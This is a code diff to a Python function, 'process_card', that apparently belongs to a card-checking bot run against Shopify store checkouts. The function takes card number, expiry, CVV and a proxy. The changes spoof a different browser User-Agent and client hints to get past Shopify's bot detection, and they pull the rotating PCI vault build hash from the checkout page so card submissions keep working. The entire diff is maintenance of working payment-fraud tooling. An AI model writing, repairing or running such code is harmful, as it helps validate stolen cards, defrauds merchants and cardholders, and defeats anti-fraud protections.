@@ -276,13 +276,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
     try:
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+            # FIX: Chrome 146 (Edge UA) was triggering Shopify bot detection on some stores.
+            # Using Chrome 137 stable (widely used, less flagged as of mid-2025).
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
             'Accept': 'application/json, text/plain, */*',
             'Accept-Language': 'en-US,en;q=0.9',
             'Content-Type': 'application/json',
             'Origin': ourl,
             'Referer': ourl,
-            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"'
         }
@@ -444,7 +446,22 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
             if ident_match:
                 ident_sig = ident_match.group(1)
-            
+
+            # FIX: Extract PCI vault build hash dynamically from checkout page.
+            # Shopify rotates /build/<hash>/ regularly — using a hardcoded hash causes
+            # the vault to reject the request with HTML instead of JSON.
+            # Pattern: looks for cardsink/number JS bundle URL or direct build hash in page.
+            pci_build_hash = "a8e4a94"  # fallback (old known hash)
+            pci_hash_match = re.search(
+                r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', text
+            )
+            if not pci_hash_match:
+                pci_hash_match = re.search(
+                    r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', unescaped_text
+                )
+            if pci_hash_match:
+                pci_build_hash = pci_hash_match.group(1)
+
             if not sst:
                 return False, "Failed to get session token", gateway, total_price, currency
             
@@ -744,9 +761,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'Accept': 'application/json',
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Origin': 'https://checkout.pci.shopifyinc.com',
-                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
-                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+                # FIX: Build hash `/a8e4a94/` was outdated — Shopify rotates these.
+                # Use the dynamic hash fetched from checkout page, or fallback to latest known hash.
+                'Referer': f'https://checkout.pci.shopifyinc.com/build/{pci_build_hash}/number-ltr.html?identifier=&locationURL=',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
                 'sec-fetch-dest': 'empty',
